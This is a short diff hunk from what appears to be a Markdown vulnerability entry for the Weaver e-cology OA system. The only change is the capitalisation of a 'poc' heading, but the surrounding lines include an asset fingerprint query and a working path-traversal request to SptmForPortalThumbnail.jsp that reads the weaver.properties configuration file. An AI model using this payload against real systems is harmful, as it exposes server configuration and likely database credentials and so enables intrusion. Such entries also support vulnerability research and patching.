@@ -8,7 +8,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 
 ```
 /portal/SptmForPortalThumbnail.jsp?preview=../ecology/WEB-INF/prop/weaver.properties
